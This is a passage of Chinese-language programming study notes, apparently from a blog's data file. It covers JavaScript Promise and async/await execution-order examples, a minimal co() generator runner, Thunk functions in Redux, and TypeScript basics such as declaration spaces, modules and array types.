不会执行 then\n\n```javascript hl:14\nconst promise = new Promise((resolve, reject) => {\n  console.log(1);\n  console.log(2);\n});\npromise.then(() => {\n  console.log(3);\n});\nconsole.log(4);\n\n//**************************************\n// output:\n// 1 2 4\n//\n// 3 不会被输出，因为 Promise 里面没有 resolve\n//**************************************\n```\n\n## 4. resolve 后会执行 then\n\n```javascript hl:16\nconst promise1 = new Promise((resolve, reject) => {\n  console.log(\"promise1\");\n  resolve(\"resolve1\");\n});\nconst promise2 = promise1.then((res) => {\n  console.log(res);\n});\nconsole.log(\"1\", promise1);\nconsole.log(\"2\", promise2);\n\n//**************************************\n// output: 下面序号表示每次打印的顺序\n// ① promise1\n// ② 1 Promise { <resolved> }  // 因为 promise1 是 resolved 状态\n// ③ 2 Promise { <pending> }   // 因为 promise2 是 pending 状态\n// ④ resolve1  // 因为 promise1 是 resolved 状态，所以 promise2 的 then 方法会执行\n//**************************************\n\n```\n\n## 5. `setTimeout` 里面嵌入 `Promise` 的场景\n\n![图片|672](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240911082045.png)\n\n打印效果：\n\n### 5.1. 左边代码\n\n``` hl:4\n'start'\n'timer1'\n'timer2'\n'timer3'  // 这个还是最后执行，setTimeout 里面嵌入 setTimeout\n```\n\n### 5.2. 右边代码\n\n``` hl:3\n'start'\n'timer1'\n'promise'\n'timer2'\n```\n\n## 6. `catch`不管被连接到哪里，都能捕获上层的错误，并且`catch()`也会返回一个`Promise`\n\n### 6.1. catch函数里没有返回值\n\n```javascript hl:13\nconst promise = new Promise((resolve, reject) => {\n  reject(\"error\");\n  resolve(\"success2\");\n});\npromise\n  .then((res) => {\n    console.log(\"then1: \", res);\n  })\n  .then((res) => {\n    console.log(\"then2: \", res);\n  })\n  .catch((err) => {\n    console.log(\"catch: \", err);\n  })\n  .then((res) => {\n    console.log(\"then3: \", res);\n  });\n\n// Output:\n// catch:  error\n// then3:  undefined\n```\n\n### 6.2. catch函数里有返回值\n\n```javascript hl:14,21\nconst promise = new Promise((resolve, reject) => {\n  reject(\"error\");\n  resolve(\"success2\");\n});\npromise\n  .then((res) => {\n    console.log(\"then1: \", res);\n  })\n  .then((res) => {\n    console.log(\"then2: \", res);\n  })\n  .catch((err) => {\n    console.log(\"catch: \", err);\n    return \"return catch\";\n  })\n  .then((res) => {\n    console.log(\"then3: \", res);\n  });\n// Output:\n// catch:  error\n// then3:  return catch\n\n```\n\n## 7. `return 2` 会被包装成`resolve(2)`\n\n```javascript\nPromise.resolve(1)\n  .then((res) => {\n    console.log(res);\n    return 2; // 等价于 return resolve(2)\n  })\n  .catch((err) => {\n    return 3;\n  })\n  .then((res) => {\n    console.log(res);\n  });\n// output: 1 2\n```\n\n## 8. resolve 后每个 then 和 catch **能被调用多次**\n\n- `Promise` 的 `.then` 或者 `.catch` **可以被调用多次**\n- 但这里 `Promise` 构造函数只执行一次\n- 或者说 `promise` 内部状态一经改变，并且有了一个值\n\t- 那么后续每次调用 `.then` 或者 `.catch` 都会直接拿到该值。\n\n```javascript\nconst promise = new Promise((resolve, reject) => {\n  setTimeout(() => {\n    console.log(\"timer\");\n    resolve(\"success\");\n  }, 1000);\n});\nconst start = Date.now();\npromise.then((res) => {\n  console.log(res, Date.now() - start);\n});\npromise.then((res) => {\n  console.log(res, Date.now() - start);\n});\n\n// Output:\n// timer\n// success 1003\n// success 1003 or success 1004\n\n```\n\n## 9. `return new Error('error!!!')` 不走 `reject`\n\n```javascript\nPromise.resolve()\n  .then(() => {\n    return new Error(\"error!!!\");\n  })\n  .then((res) => {\n    console.log(\"then: \", res);\n  })\n  .catch((err) => {\n    console.log(\"catch: \", err);\n  });\n\n// Output:\n// then:  Error: error!!!\n```\n\n## 10. 走 catch 的场景\n\n```javascript hl:3,5\nPromise.resolve()\n  .then(() => {\n    return Promise.reject(new Error(\"error!!!\"));\n    // or\n    throw new Error(\"error!!!\");\n  })\n  .then((res) => {\n    console.log(\"then: \", res);\n  })\n  .catch((err) => {\n    console.log(\"catch: \", err);\n  });\n\n// Output:\n// catch:  Error: error!!!\n```\n\n>  `return Promise.reject(new Error(\"error!!!\"));` 一定会走 catch ，别管 return ，因为会先执行 `Promise.reject`\n\n## 11. 没有 catch ，也不会导致同步代码中断\n\n```javascript hl:11\nconsole.log(1);\n\nsetTimeout(() => console.log(2));\n\nPromise.resolve().then(() => console.log(3));\n\nPromise.resolve().then(() => setTimeout(() => console.log(4)));\n\nPromise.resolve().then(() => {\n  throw Error();\n  console.log(5); // 不打印，但是 Promise 的错误会被 window unRejectError? 捕获\n});\n\nsetTimeout(() => console.log(6));\n\nconsole.log(7);\n\n1 7\n3 \n2 6 \n4\n\nUncaught (in promise) Error\n```\n\n> 关于 Promise 的错误捕获，更多参考，[22. window.onerror 和 window.addEventListener 的区别？](/post/49pCkp80.html)\n\n## 12. 死循环\n\n```javascript hl:2\nconst promise = Promise.resolve().then(() => {\n   // 返回了本身，会死循环\n  return promise;\n})\npromise.catch(console.err)\n```\n\n## 13. 值穿透 \n\n```javascript\n// 发生了 值穿透\nPromise.resolve(1)\n  .then(2)\n  .then(Promise.resolve(3))\n  // console.log 是一个函数，它被作为参数传递给 .then()\n  // 当 Promise 解析时，.then() 会调用这个函数，并将前一个 Promise 的值作为参数传入\n  // 所以这里的 console.log 会打印出 1\n  .then(console.log);\n```\n\n- `.then` 或者 `.catch` 的参数期望是`函数`，传入非函数则会发生**值透传**\n- `.then()` 会**执行**传入的函数参数，并把参数传**递给它**\n\n下面打印出 `4`\n\n```javascript hl:5\nPromise.resolve(1)  \n    .then(2)  \n    .then(Promise.resolve(3))  \n    .then(() => {  \n        return Promise.resolve(4);  \n    }).then(console.log)  \n  \n// 打印结果 4\n```\n\n## 14. 需要注意是否有 reject 函数\n\n> `.then()`方法的第二个参数`reject`也是可以捕获错误\n\n```javascript hl:7,8,13\nPromise.reject(\"err!!!\")\n  .then(\n    (res) => {\n      // 这里不会执行\n      console.log(\"success\", res);\n    },\n    // 这里会执行: error err!!!\n    (err) => {\n      console.log(\"error\", err);\n    },\n  )\n  .catch((err) => {\n    // 所以，这里没错误可以捕获了\n    console.log(\"catch\", err);\n  });\n\n```\n\n## 15. finally 虽然一定会执行，但还**是有顺序的** \n\n```javascript hl:13,20,3,7\nPromise.resolve(\"2\")\n  .finally(() => {\n    console.log(\"f2\");\n    return \"3\";\n  })\n  .then((res) => {\n    console.log(res);\n  });\n// 打印结果 f2 2\n\n```\n\n```javascript\nPromise.resolve(\"1\")\n  .finally(() => {\n    console.log(\"f1\");\n    throw new Error(\"f1 error\");\n  })\n  .then((res) => {\n    console.log(res);\n  })\n  .catch((err) => {\n    console.log(err);\n  });\n\n// 打印结果：\n// f1\n// VM327:10 Error: f1 error\n//     at <anonymous>:4:11\n//     at <anonymous>\n\n```\n\n## 16. `finally()`也是微任务队列\n\n```javascript \nfunction promise1() {\n  return new Promise((resolve) => {\n    console.log(\"p1\");\n    resolve(\"1\");\n  });\n}\nfunction promise2() {\n  return new Promise((resolve, reject) => {\n    console.log(\"p2\");\n    reject(\"err\");\n  });\n}\npromise1()\n  .then((res) => console.log(res))\n  .catch((err) => console.log(err))\n  // 第一轮，不会将 finally 里的函数放入微任务队列\n  .finally(() => console.log(\"f1\"));\n\npromise2()\n  .then((res) => console.log(res))\n  .catch((err) => console.log(err))\n  .finally(() => console.log(\"f2\"));\n\np1 p2 \n1 err \nf1 f2\n\n```\n\n## 17. 注意：每次碰到 then/catch/finally 都会产生一个栈，注意先后顺序，都有层级关系在的\n\n> 比如上题\n\n![图片&文件](./files/20241207-1.png)\n\n比如换个顺序，打印就不一样了，如下图\n\n![图片&文件](./files/20241226-1.png)\n\n## 18. `.catch()`函数能够捕获到`.all()`里**最先**的那个异常，并且**只执行一次**\n\n> [!danger]\n> - 并不是只要有异常就完事了，每个都会执行\n> - catch 只捕获最新的那个异常，并且执行一次\n> - `Promise.all().then()`结果中数组的顺序和`Promise.all()`接收到的数组顺序一致\n\n```javascript\nfunction runAsync(x) {\n  return new Promise((resolve) =>\n    setTimeout(() => resolve(x, console.log(x)), 1000),\n  );\n}\nfunction runReject(x) {\n  return new Promise((resolve, reject) =>\n    setTimeout(() => reject(`Error: ${x}`, console.log(x)), 1000 * x),\n  );\n}\nPromise.all([runAsync(1), runReject(4), runAsync(3), runReject(2)])\n  .then((res) => console.log(res))\n  .catch((err) => console.log(err));\n\n1; // 1s后输出\n3; // 1s后输出\n2; // 2s后输出\nError: 2; // 2s后输出\n4; // 4s后输出\n\n```\n\n再看下面一段代码，第 4s 即使 reject 了，也不再触发17 行了\n\n```javascript hl:14,17\nfunction runAsync(x) {\n  return new Promise((resolve) =>\n    setTimeout(() => resolve(x, console.log(x)), 1000),\n  );\n}\nfunction runReject(x) {\n  return new Promise((resolve, reject) =>\n    setTimeout(() => reject(`Error: ${x}`, console.log(x)), 1000 * x),\n  );\n}\nPromise.all([runAsync(1), runReject(4), runAsync(3), runReject(2)])\n  .then(\n    (res) => console.log(res),\n    // 添加 reject 回调函数参数\n    (reason) => console.log(\"reject\", reason),\n  )\n  // 这段代码不执行\n  .catch((err) => console.log(\"catch:\", err));\n\n1; // 1s 后输出 1\n3; // 1s 后输出 3\n2; // 2s 后输出 2\nreject Error: 2; // 2s 后输出 Error: 2\n4; // 4s 后输出 4\n\n```\n\n现在，让我们解释为什么上面 `catch` 没有被触发：\n\n1. `Promise.all` 的特性：\n    - 当其中任何一个 Promise 被拒绝时，`Promise.all` 就会立即拒绝，并返回第一个被拒绝的 Promise 的原因。\n    - 在这个例子中，`runReject(2)` 会在 2 秒后首先被拒绝。\n2. `then` 方法的处理：\n    - 您在 `then` 方法中提供了两个回调函数：\n        - 一个用于成功（第一个参数）\n        - 一个用于失败（第二个参数）。\n    - 当 `Promise.all` 被拒绝时，它会调用 `then` 中的第二个回调函数（失败回调）。\n    - 在这个例子中，失败回调 `(reason) => console.log(\"reject\", reason)` 被调用。\n3. 错误被处理：\n    - 一旦错误在 `then` 的第二个回调中被处理，JavaScript 认为这个错误已经被\"捕获\"和\"处理\"了。\n    - 因此，错误不会继续传播到后面的 `catch` 语句。\n4. `catch` 的作用：\n    - ==`catch` 主要用于捕获在前面的 `then` 链中未被处理的错误。==\n    - 在这个例子中，错误已经在 `then` 的第二个回调中被处理了，所以 `catch` 不会被触发\n\n> 总结就是：**Promise.all 只处理一个异常，其他的都被吞了**\n\n\n### 注意：上面的写法很诱惑人\n\n![图片&文件](./files/20241226-2.png)\n\n## 19. race **会获取最新有结论的任务**，然后走==后一个==then 或者 catch，其他的**正常执行**，==再之后==的 then和 catch 了,执行结果会被抛弃\n\n```javascript\nfunction runAsync(x) {\n  return new Promise((r) => setTimeout(() => r(x, console.log(x)), 1000));\n}\nPromise.race([runAsync(1), runAsync(2), runAsync(3)])\n  // 只需要有一个promise实例率先改变状态，新的Promise状态就跟着改变\n  // 然后就会调用then方法，绑定回调函数\n  // 之后就不会在理会其他promise实例的状态，但还是会继续执行\n  // 只不过不走后面 then 和 catch 方法了\n  .then((res) => console.log(\"result: \", res))\n  .catch((err) => console.log(err));\n\n// 1\n// 'result: ' 1\n// 2\n// 3\n```\n\n## 20. `await async2()` 会立即同步执行 `async2`\n\n```javascript hl:3\nasync function async1() {\n  console.log(\"1\");\n  // 这里 async2() 会立即执行，所以立即同步打印 3\n  await async2();\n  console.log(\"2\");\n}\nasync function async2() {\n  console.log(\"3\");\n}\nasync1();\nconsole.log(\"4\");\n// 打印结果 1 3 4 2\n```\n\n## 21. 并不需要 sync 一定返回一个 promise，然后才执行下面的东西，因为 async 默认有返回值\n\n```javascript\nasync function async1() {\n  console.log(\"1\");\n  await async2();\n  console.log(\"2\");\n}\n\n// 并不需要 async2 一定返回一个 promise\n// 下面这个没有返回值，那么返回 undefined\n// async 函数 默认的返回 promise \nasync function async2() {\n  // 下一轮宏任务，所以最后执行\n  setTimeout(() => {\n    console.log(\"3\");\n  }, 0);\n  console.log(\"4\");\n}\nasync1();\nconsole.log(\"5\");\n\n1;\n4;\n5;\n2;\n3;\n```\n\n## 22. 注意 setTimeout(fn,0) 的第一次解析的顺序\n\n```javascript hl:18,5\nasync function async1() {\n  console.log(\"1\");\n  await async2();\n  console.log(\"2\");  // 肯定先于 3\n  setTimeout(() => {\n    console.log(\"3\");\n  }, 0);\n}\nasync function async2() {\n  setTimeout(() => {\n    console.log(\"4\");\n  }, 0);\n  console.log(\"5\");\n}\n\nasync1();\n\n// 先于第 5 行解析到\nsetTimeout(() => {\n  console.log(\"6\");\n}, 0);\n\nconsole.log(\"7\");\n\n// 1 5 7 2 4 6 3\n\n```\n\n## 23. async 的返回值\n\n```javascript\nasync function fn() {\n  // return await 1234\n  // 等同于 相等于 resolve(123)\n  return 123;\n}\nfn().then((res) => console.log(res));\n```\n\n## 24. await new Promise() 注意有没有 resolve 或者 reject \n\n```javascript\nasync function async1() {\n  console.log(\"1\");\n  // Promise是没有返回值的，也就是它的状态始终是pending状态\n  // 因此相当于一直在await,后面的 3 和 4 不会被打印\n  await new Promise((resolve) => {\n    console.log(\"2\");\n    // 下面的注释放开就能正常打印所有的 log\n    // resolve(\"22\");\n  });\n  console.log(\"3\");\n  return \"4\";\n}\nconsole.log(\"5\");\nasync1().then((res) => console.log(res));\nconsole.log(\"6\");\n\n// 5 1 2 6\n\n```\n\n## 25. 如果在`async函数`中抛出了错误，则终止**错误结果**，不会继续向下执行\n\n```javascript hl:3\nasync function async1() {\n  await async2();\n  // 下面都是执行了，因为 async2 报错了\n  console.log(\"2\");\n  return \"3\";\n}\nasync function async2() {\n  return new Promise((resolve, reject) => {\n    console.log(\"3\");\n    reject(\"e4\");\n  });\n}\nasync1().then((res) => console.log(res));\n\n// 3\n// Uncaught (in promise) e4\n\n```\n","ONxVttwC":"\n# JavaScript 异步编程：async、await 的实现原理\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 预备知识 \n\n### 1.1. 回调函数\n\n略\n\n### 1.2. Promise\n\n略\n\n### 1.3. generate 协程\n\n```javascript hl:1\nfunction* numberGenerator() {\n    yield 1;\n    yield 2;\n    yield 3;\n}\n\nconst gen = numberGenerator();\nconsole.log(gen.next().value); // 1\nconsole.log(gen.next().value); // 2\nconsole.log(gen.next().value); // 3\n\n```\n\n### 1.4. Thunk 函数与 thunkify\n\n- Thunk 是一种将多参数函数转换为单参数的偏应用函数的方法\n- Thunk通常用于将`回调风格`的函数转换为 `promise 风格`\n\n```javascript hl:8,11\n// 普通的回调风格函数\nfunction fetchData(callback) {\n    // 模拟异步操作\n    setTimeout(() => callback(null, 'data'), 1000);\n}\n\n// Thunk 函数\nfunction thunkify(fn) {\n    return function(...args) {\n        return function(callback) {\n            return fn.call(this, ...args, callback);\n        }\n    }\n}\n\nconst thunkedFetchData = thunkify(fetchData);\nconst thunk = thunkedFetchData();\nthunk((err, data) => console.log(data));\n\n```\n\n### 1.5. co 函数\n\n- co 是一个著名的 `npm 包`，它是一个生成器执行器，允许你**使用同步的方式编写异步代码**。\n- 它可以自动执行生成器函数，并处理 `yield` 的 Promise、thunks 或 数组/对象。\n\n```javascript\nconst co = require('co');\n\nco(function* () {\n    const result = yield Promise.resolve(1);\n    return result;\n}).then(value => console.log(value));\n```\n\n## 2. 生成器 vs async/await\n\n- 生成器是更底层的机制，需要手动迭代或使用执行器。\n- async/await 是建立在**生成器和 Promise 之上**的高级语法，提供了更简洁的异步编程方式。\n- async/await 可以看作是**生成器和自动执行器**的语法糖。\n\n## 3. Thunk vs Promise\n\n- Thunk 主要用于将回调风格的函数转换为更易于操作的形式。\n- Promise 提供了一种标准的异步操作表示方法，具有更丰富的功能（如 .then()、.catch() 等）。\n\n## 4. co 函数 vs async/await\n\n- `co 函数`是 async/await 出现之前的一种解决方案，用于简化生成器的使用。\n- `async/await` 可以看作是 `co 函数`的`语言级实现`，提供了更原生和简洁的语法。\n\n## 5. 协程 vs 其他概念\n\n- `协程`是一个更广泛的概念，生成器是 JavaScript 中`协程`的一种实现。\n- `async/await、Thunk、co 函数`都可以看作是**基于协程思想的不同层次的抽象和实现**。\n\n## 6. co 函数的最简实现\n\nco 函数的核心功能是自动执行生成器函数，将 `yield` 的值转换为 Promise，并处理异步流程。\n\n以下是一个最简单的 `co 函数`实现：\n\n```javascript hl:5\nfunction co(gen) {\n    // 如果传入的是生成器函数，先执行它得到生成器对象\n    const generator = typeof gen === 'function' ? gen() : gen;\n    \n    // 返回一个 Promise\n    return new Promise((resolve, reject) => {\n        // 定义递归处理函数\n        function step(nextValue) {\n            let result;\n            \n            try {\n                // 执行下一步，传入上一步的值\n                result = generator.next(nextValue);\n            } catch (e) {\n                // 如果执行出错，reject Promise\n                return reject(e);\n            }\n            \n            // 如果生成器执行完毕，resolve 最终值\n            if (result.done) {\n                return resolve(result.value);\n            }\n            \n            // 将 yield 的值转换为 Promise\n            Promise.resolve(result.value)\n                .then(value => step(value))  // 继续执行下一步\n                .catch(reject);              // 处理错误\n        }\n        \n        // 开始执行\n        step();\n    });\n}\n```\n\n### 6.1. 使用建议\n\n- 在现代JavaScript中，**推荐使用 async/await 而不是 co**\n\t- async/await 可以看作是这种模式的**语言级实现**\n- 理解 co 的实现有助于深入理解 async/await 的工作原理\n- 在需要支持旧版本环境时，co 仍然是一个有用的工具\n\n\n","KOCA4ZsB":"\n# JavaScript 异步编程：Thunk 函数\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 基本定义：==延迟函数执行== \n\n   \nThunk 是一个被包裹在另一个函数中的函数，通常**用于延迟一个计算或操作的执行**。\n\n> Thunk function 在异步编程和函数式编程中经常使用\n\n## 2. 主要特点\n\n   - 延迟执行：Thunk 允许你推迟一段代码的执行。\n   - 封装复杂性：它可以封装复杂的逻辑，使代码更清晰。\n   - 参数传递：可以在不立即执行函数的情况下传递参数。\n\n## 3. 在异步编程中的应用\n\nThunk 在处理异步操作时特别有用，尤其是在 `Redux` 等状态管理库中\n\n### 3.1. 基本的 thunk 示例\n\n```javascript\n// 普通函数\nfunction add(x, y) {\n  return x + y;\n}\n\n// Thunk 函数\nfunction addThunk(x, y) {\n  return function() {\n    return x + y;\n  };\n}\n\nconsole.log(add(2, 3));        // 输出: 5\nconsole.log(addThunk(2, 3));   // 输出: [Function]\nconsole.log(addThunk(2, 3)()); // 输出: 5\n```\n\n### 3.2. 在异步操作中使用 thunk\n\n```javascript\nfunction fetchUserData(userId) {\n  return function(dispatch) {\n    dispatch({ type: 'FETCH_USER_REQUEST' });\n    \n    fetch(`https://api.example.com/users/${userId}`)\n      .then(response => response.json())\n      .then(data => {\n        dispatch({ type: 'FETCH_USER_SUCCESS', payload: data });\n      })\n      .catch(error => {\n        dispatch({ type: 'FETCH_USER_FAILURE', error });\n      });\n  };\n}\n\n// 使用\nstore.dispatch(fetchUserData(123));\n```\n\n在这个例子中，`fetchUserData` 返回一个函数（thunk），而不是一个普通的 action 对象。\n\n这个返回的函数接收 `dispatch` 作为参数，允许在异步操作完成后再次派发 action。\n\n### 3.3. Thunk 在 Redux 中的应用\n\n在 Redux 中，action 创建器通常返回一个普通的 JavaScript 对象。但是，使用 Redux Thunk 中间件后，action 创建器可以返回一个函数，这个函数就是一个 thunk。\n\n```javascript\n// 配置 Redux Thunk\nimport { createStore, applyMiddleware } from 'redux';\nimport thunk from 'redux-thunk';\nimport rootReducer from './reducers';\n\nconst store = createStore(\n  rootReducer,\n  applyMiddleware(thunk)\n);\n\n// 使用 thunk action 创建器\nconst fetchPosts = (subreddit) => (dispatch) => {\n  dispatch(requestPosts(subreddit));\n  return fetch(`https://www.reddit.com/r/${subreddit}.json`)\n    .then(response => response.json())\n    .then(json => dispatch(receivePosts(subreddit, json)));\n};\n\n// 派发 thunk\nstore.dispatch(fetchPosts('reactjs'));\n```\n\n## 4. 总结\n\n- Thunk 函数是一种`延迟执行`的函数。\n- 在异步编程中，thunk 可以帮助管理复杂的异步流程\n- 在 Redux 等状态管理库中，thunk 用于**处理异步 action**。\n- `Thunk` 提供了一种方式来封装复杂的逻辑，使代码更加模块化和可测试\n\n通过使用 thunk，我们可以更灵活地控制函数的执行时机，特别是在处理异步操作或需要访问 Redux store 的情况下","rHFbrCfc":"\n# 前言\n\n\n>   Typescript 相关\n\n目录：\n- [1. Typescript 基础篇](/post/JpwFLP0g.html)\n","JpwFLP0g":"\n# Typescript 基础篇\n\n`#typescript` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. 编译 \n\n可通过 `tsconfig.json` 来指定哪些文件编译等编译选项，如\n\n```json\n{\n  \"files\": [\n    \"./some/file.ts\"\n  ],\n  \"include\": [\n    \"./folder\"\n  ],\n  \"exclude\": [\n    \"./folder/**/*.spec.ts\",\n    \"./folder/someSubFolder\"\n  ]\n}\n```\n\n>  playground： [http://www.typescriptlang.org/play/](http://www.typescriptlang.org/play/) \n\n可运行 `ts` 的编译工具\n\n1、TypeScript 官方提供的编译器叫做 `tsc` \n\n2、**ts-node**\n\n```bash\nnpx ts-node script.ts\n\n# 或者\nts-node script.ts\n```\n\n## 2. 声明空间\n\n在 TypeScript 里存在两种声明空间：`类型声明空间`与`变量声明空间`\n\n1. `变量声明空间`可以直接当做变量赋值使用\n\t- 但如`const foo = 123;` \n\t\t- 中的 `foo`不能当做**类型注解**使用\n\t\t\t- 下面有代码说明\n2. `类型声明空间` 可以当做`类型注解`\n\t- 但不能当做`类型注解` 使用\n\n### 2.1. 类型声明空间\n\n![|696](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/76e5d299da3f92d03fa51b2e9528079d.png)\n\n即 `interface B{}` 只是一个`类型申明`，不能当做`变量`使用\n\n>  看上图，`b1` 和 `c1` 都飘红警告了\n\n### 2.2. 变量声明空间\n\n```javascript\n/**\n * ① Class Foo 提供了一个类型 Foo 到类型声明空间\n * ② 把一个类来当做变量传递时，ts 会把这个类当做值来处理\n * */\nclass Foo {\n}\n\nconst someVar: Foo = Foo;\n\n\n/**\n * ① 一些用 var 声明的变量，也只能在变量声明空间使用，不能用作类型注解，如下示例\n */\nconst foo = 123;\nlet bar: foo; \n// ts2749: 'foo' refers to a value, but is being used as a type here. Did you mean 'typeof foo'?\n\n```\n\n## 3. TS 模块\n\n### 3.1. 全局模块\n\n你可以在项目中创建一个 `全局声明文件 global.d.ts`，用于声明全局变量。比如全局使用的 `JQuery`\n\n```typescript\ndeclare var jQuery: (selector: string) => any;\n```\n\n>  需要使用 `declare` 关键词\n\n### 3.2. 文件模块\n\n即 `文件模块系统`，耳熟能详的的 `CMD AMD ESM` 等等，这里只讨论 ESM ，而且只需要注意一下几种平时自己不常用的写法\n\n主要是`as` 的几个写法，如下：\n\n```typescript\nexport { someVar as aDifferentName };\n\nimport { someVar as aDifferentName } from './foo';\n\nimport * as foo from './foo';\n```\n\n## 4. 命名空间\n\n使用 `namespace` 关键词，如下：\n\n```typescript hl:1\nnamespace Utility {\n  export function log(msg) {\n    console.log(msg);\n  }\n  export function error(msg) {\n    console.log(msg);\n  }\n}\n\n// usage\nUtility.log('Call me');\nUtility.error('maybe');\n```\n\n以上 `ts` 最终转成 `js` 的样子如下，是的，是不是很类似之前` JQuery` 的实现方式。\n\n```javascript\n(function (Utility) {\n  // 添加属性至 Utility\n})(Utility || Utility = {});\n```\n\n## 5. 动态导入表达式\n\n其实就类似于 Webpack 的 `import()` （首选，ECMAScript 的提案）和 `require.ensure()` ，这样就能实现**代码分割能力** ，即`Code Splitting` ，举个例子，比如我们需要懒加载 `mement` \n\n```typescript\nimport(/* webpackChunkName: \"momentjs\" */ 'moment')\n  .then(moment => {\n    // 懒加载的模块拥有所有的类型，并且能够按期工作\n    // 类型检查会工作，代码引用也会工作 \n    const time = moment().format();\n    console.log('TypeScript >= 2.4.0 Dynamic Import Expression:');\n    console.log(time);\n  })\n  .catch(err => {\n    console.log('Failed to load moment', err);\n  });\n```\n\n## 6. Typescript 类型系统\n\n### 6.1. 基本类型\n\n即以下 8 种类型\n\n- boolean\n- string\n- number\n- bigint\n- symbol\n- object\n- undefined\n- null\n\n1、**TypeScript 继承了 JavaScript 的类型设计**，以上8种类型可以看作 TypeScript 的基本类型。\n\n2、`undefined` 和 `null` 既可以作为**值**，也可以作为**类型**，取决于在哪里使用它们。\n\n3、这里单独说下 `object` 根据 JavaScript 的设计，`object` 类型包含了所有对象、数组和函数。\n\n```typescript\nconst x:object = { foo: 123 };\nconst y:object = [1, 2, 3];\nconst z:object = (n:number) => n + 1;\n```\n\n---\n\n4、包装类型：5 种\n\n（1）`Symbol()` 和 **`BigInt()`** 不能作为构造函数使用，即他俩无法直接获取它们的**包装对象** \n\n- boolean：`Boolean()`\n- string `String()`\n- number `Number()`\n- bigint  \n- symbol\n\n（2）包装对象类型与字面量类型：**大写类型同时包含包装对象和字面量两种情况，小写类型只包含字面量，不包含包装对象。**\n\n- **包装对象** 和 **字面量** ： 对应关系如下\n- Boolean 和 boolean\n- String 和 string\n- Number 和 number\n- BigInt 和 bigint\n- Symbol 和 symbol\n\n举例：\n\n- 大写是小写的超集\n\n```typescript hl:2,11\n\n① 即大写是小写形式的超集 \n\nconst s1:String = 'hello'; // 正确\nconst s2:String = new String('hello'); // 正确\n\nconst s3:string = 'hello'; // 正确\nconst s4:string = new String('hello'); // 报错\n\n\n② 建议只使用小写类型，不使用大写类型。因为绝大部分使用原始类型的场合，都是使用字面量，不使用包装对象，\n\n比如，Math.abs(小写类型)\nconst n1:number = 1;\nconst n2:Number = 1;\n\nMath.abs(n1) // 1\nMath.abs(n2) // 报错\n```\n\n（3）`Object` 类型与 `object` 类型 \n\n先看 **大写的 Object** \n\n```typescript hl:3\n\n①  大写的Object类型代表 JavaScript 语言里面的广义对象。\n    所有可以转成对象的值，都是Object类型，这囊括了几乎所有的值\n\nlet obj:Object;\n \nobj = true;\nobj = 'hi';\nobj = 1;\nobj = { foo: 123 };\nobj = [1, 2];\nobj = (a:number) => a + 1;\n\n② 事实上，除了undefined和null这两个值不能转为对象，其他任何值都可以赋值给Object类型，比如一下示例会报错\n\nlet obj:Object;\n\nobj = undefined; // 报错\nobj = null; // 报错\n\n\n③ 空对象 {} 是Object类型的简写形式，所以使用Object时常常用空对象代替，如下：\n\nlet obj:{};\n \nobj = true;\nobj = 'hi';\nobj = 1;\nobj = { foo: 123 };\nobj = [1, 2];\nobj = (a:number) => a + 1;\n\n④ 显然，无所不包的 Object类型 既不符合直觉，也不方便使用，所以不建议使用\n\n```\n\n> [!danger]\n **无所不包的Object类型既不符合直觉，也不方便使用，所以不建议使用**\n\n再看 **小写的 object** , ==只包含对象、数组和函数==， 不包括原始类型的值，比如下面代码\n\n```typescript\nlet obj:object;\n \nobj = { foo: 123 };\nobj = [1, 2];\nobj = (a:number) => a + 1;\nobj = true; // 报错\nobj = 'hi'; // 报错\nobj = 1; // 报错\n```\n\n注意，无论是大写的Object类型，还是小写的object类型，都 **只包含 JavaScript 内置对象原生的属性和方法**，用户自定义的属性和方法都不存在于这两个类型之中。\n\n```typescript\n\nconst o1:Object = { foo: 0 };\nconst o2:object = { foo: 0 };\n\no1.toString() // 正确\no1.foo // 报错\n\no2.toString() // 正确\no2.foo // 报错\n\n```\n\n> 如下图，都报警告了，这个值得注意，即 object 其实不常用，最好直接定义 interface 类型\n> \n>  ![|608](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/b4674d165a9a0fa7a4faf5501b8ac303.png)\n\n### 6.2. 数组类型\n\n#### 6.2.1. 基本用法\n\n```typescript\nlet a:boolean[]; // 同 let a:Array<boolean>;\nlet b:any[];   // 同 let b:Array<any>;\nlet arr:(number|string)[];  // 同 let arr:Array<number|string>;\n```\n\n#### 6.2.2. 读取数组成员类型\n\nTypeScript 允许使用方括号读取数组成员的类型。如下：\n\n```typescript\n① 读取数组成员的类型\ntype Names = string[];\ntype Name = Names[0]; // string\n\n② 由于数组成员的索引类型都是 number，所以读取成员类型也可以写成下面这样\ntype Name = Names[number]; // string\n\n③ 那么这种写法是可以的吗？\ntype Name = Names[99999]\n```\n\n#### 6.2.3. 数组的类型推断\n\n为数组赋值时，TypeScript 会**自动更新类型推断**，如下：\n\n```typescript\nconst arr = [];\narr // 推断为 any[]\n\narr.push(123);\narr // 推断类型为 number[]\n\narr.push('abc');\narr // 推断类型为 (string|number)[]\n\n② 下面这种会推断初始值为 number 后面再赋值就会报错了\n// 推断类型为 number[]\nconst arr = [123];\n\narr.push('abc'); // 报错\n```\n\n#### 6.2.4. 只读数组\n\n（1）`const` 命令声明的数组变量是可以改变成员的，如下：\n\n```typescript\nconst arr = [0, 1];\narr[0] = 2;\n```\n\n（2）声明只读数组，即 `readonly`, 下面示例中，`arr` 是一个只读数组，删除、修改、新增数组成员都会报错。\n\n```typescript\nconst arr:readonly number[] = [0, 1];\n\narr[1] = 2; // 报错\narr.push(3); // 报错\ndelete arr[0]; // 报错\n```\n\n（3）`number[]`其实是`readonly number[]`的子类型\n\n```typescript\nlet c:number[] = [0, 1];\nlet p:readonly number[] = c; // 正确\n\nc = p; // 报错\n```\n\n> 所以，这里有个用法就是，如果只是希望根据数组生成另外一个数组，比如过滤出数组等，就可以传入 readonly 的数组 ？ \n\n```typescript\n\n① getSum()的参数s是一个数组，传入只读数组就会报错。原因就是只读数组是数组的父类型，父类型不能替代子类型\nfunction getSum(s:number[]) {\n  // ...\n}\n\nconst arr:readonly number[] = [1, 2, 3];\n\ngetSum(arr) // 报错\n\n② 使用 类型断言 as 解决报错\n\ngetSum(arr as number[])\n```\n\n---\n\n疑惑：\n\n![|571](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/9e33333a92b80383104547a2393f5fef.png)\n\n> 